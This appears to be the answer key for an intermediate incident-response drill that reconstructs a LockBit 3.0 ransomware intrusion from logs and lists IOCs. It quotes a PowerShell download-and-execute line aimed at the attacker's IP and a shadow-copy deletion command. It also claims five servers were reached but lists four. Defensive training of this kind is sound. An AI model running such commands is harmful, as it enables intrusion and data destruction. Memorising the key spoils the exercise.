# Solution: Drill 02 (Intermediate) — Ransomware Log Analysis

## Part A: Timeline Reconstruction

**1.
Initial Access Vector:**
VPN credential compromise.
The attacker connected via VPN using `mjones`' credentials.
The access originated from IP `185.220.101.77` in Romania (country=RO), which is the same IP that later served the ransomware payload.
This is not a legitimate connection — it is a stolen credential or credential stuffing attack.

**2.
First VPN authentication time:**
`2024-03-15T03:12:44Z` — early morning UTC, outside business hours.

**3.
Is the VPN connection unusual?**
Yes, for three reasons:

* **Geographic anomaly:** The previous VPN connection for `mjones` at 21:45 UTC on March 14 came from `76.12.44.33` (US). The new connection 5.5 hours later comes from `185.220.101.77` (Romania). This is physically impossible travel if `mjones` is a US-based employee.
* **Time:** 03:12 AM UTC is outside business hours for US employees.
* **Source IP reputation:** `185.220.101.77` later serves the ransomware payload — it is the attacker's server.

**4.
Privilege escalation (mjones → Administrator):**

* After VPN login, `mjones` connected to 5 different servers in rapid succession via SMB (Event ID 4624, Logon_Type=3)
* At 03:14:55, **Event ID 4648** shows `mjones` using explicit credentials for `Administrator` on DC01 — this is either pass-the-hash, stolen credentials, or credential dumping from a previous step
* At 03:15:10, a successful Administrator logon occurs from the VPN IP

**5.
Servers accessed via lateral movement:**
5 servers in 67 seconds:

* `SERVER-FS01` (file server)
* `SERVER-BACKUP01` (backup server — critical target to disable recovery)
* `SERVER-SQL01` (database server)
* `SERVER-DC01` (domain controller — highest-value target)

---

## Part B: Ransomware Analysis

**6.
Ransomware family:**
**LockBit 3.0** (also known as LockBit Black).
Evidence:

* File created: `C:\Windows\Temp\LockBit3.exe`
* Renamed files get extension `.lockbit3`
* Ransom note filename: `README-LockBit.txt`
* Execution uses `-pass [HASH_REDACTED]` — LockBit 3.0 requires a password/key to execute, a distinctive feature

**7.
Download source:**
`http://185.220.101.77/payload.ps1` — the attacker's server, same IP as the initial VPN connection source.
The PowerShell command used: `IEX(New-Object Net.WebClient).DownloadString('http://185.220.101.77/payload.ps1')` — this is a classic "download and execute" technique.

**8.
Ransom note filename:**
`README-LockBit.txt` — dropped in 847 locations (every directory with encrypted files)

**9.
Anti-recovery command:**
`vssadmin delete shadows /all /quiet` — this deletes all **Volume Shadow Copies** (Windows backup snapshots).
This is a standard ransomware defense-evasion technique to prevent victims from restoring files using Windows restore points.
Without VSS backups and without offline backups, recovery requires paying the ransom.

**10.
Files encrypted / time:**

* Files encrypted: **15,234** (from `count=15234`)
* Duration: **487 seconds** (~8 minutes) — ransomware can encrypt thousands of files per minute
* Note: `SERVER-FS01` is a file server — 15,234 files could represent entire user home directories or network shares

**11.
Data exfiltration estimate:**
From Log Set 5, the 04:45:12 entry: `bytes=5368709120`

```text
5,368,709,120 bytes ÷ 1,073,741,824 bytes/GB = 5.0 GB
```

**Approximately 5 GB of data was exfiltrated** before the encryption started at 04:58.
This is double-extortion: data stolen first, then encrypted.
The attacker will threaten to publish the 5 GB unless additional payment is made.

---

## Part C: IOC List

| IOC Type | Value | Context |
|----------|-------|---------|
| IP Address | `185.220.101.77` | Attacker C2/RDP server (Romania); served payload; received exfiltrated data |
| File Hash | LockBit3.exe (hash not visible in logs) | Ransomware binary |
| Filename | `LockBit3.exe` | Ransomware binary dropped to `C:\Windows\Temp\` |
| Filename | `README-LockBit.txt` | Ransom note |
| URL | `http://185.220.101.77/payload.ps1` | Ransomware download URL |
| File Extension | `.lockbit3` | Encrypted file extension |
| Username | `mjones` | Compromised account used for initial access |
| Command | `vssadmin delete shadows /all /quiet` | Shadow copy deletion (anti-recovery) |
| Mutex | (search VirusTotal for LockBit3 mutex) | LockBit anti-double execution |
| PowerShell command | `IEX(New-Object Net.WebClient).DownloadString(...)` | Download cradle technique |

---

## Part D: Executive Summary

On March 15, 2024, the company suffered a ransomware attack attributed to the LockBit 3.0 criminal group.
An attacker compromised the VPN credentials of employee Mary Jones and logged in from Romania at 3:12 AM — outside business hours and inconsistent with her normal login location in the United States.
Over the next 90 minutes, the attacker moved laterally across five servers including the domain controller, gaining Administrator privileges.
Before deploying ransomware, approximately 5 GB of company data was exfiltrated to the attacker's server, creating a secondary extortion risk.
The ransomware then encrypted 15,234 files on the file server and deleted all backup snapshots, significantly complicating recovery options.
Immediate priorities are: isolating all affected systems, engaging incident response support, and assessing which data was exfiltrated to evaluate regulatory notification obligations.
